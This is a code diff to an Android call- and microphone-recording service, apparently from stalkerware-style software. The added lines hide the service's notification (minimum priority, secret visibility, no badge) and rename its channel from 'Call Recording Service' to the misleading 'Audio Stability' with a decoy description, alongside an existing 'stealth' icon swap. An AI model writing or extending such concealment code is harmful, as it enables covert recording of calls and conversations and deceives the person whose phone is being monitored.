@@ -146,7 +146,8 @@ public class CallRecordService extends Service {
                 .setSmallIcon(stealth ? R.drawable.ic_sprocket_gear : R.drawable.app_logo)
                 .setContentIntent(pendingIntent)
                 .setOngoing(true)
-                .setPriority(NotificationCompat.PRIORITY_LOW)
+                .setPriority(NotificationCompat.PRIORITY_MIN)
+                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                 .build();
 
         try {
@@ -175,9 +176,10 @@ public class CallRecordService extends Service {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
                     CHANNEL_ID,
-                    "Call Recording Service",
-                    NotificationManager.IMPORTANCE_LOW);
-            channel.setDescription("Service for recording calls and microphone");
+                    "Audio Stability",
+                    NotificationManager.IMPORTANCE_MIN);
+            channel.setDescription("Background audio support service");
+            channel.setShowBadge(false);
 
             NotificationManager manager = getSystemService(NotificationManager.class);
             if (manager != null) {
@@ -579,6 +581,7 @@ public class CallRecordService extends Service {
     public void onDestroy() {
         super.onDestroy();
         Log.d(TAG, "CallRecordService onDestroy");
+        isForeground = false; // CRITICAL: Reset state so next start calls startForeground()
 
         if (isRecordingCall) {
             stopCallRecording();
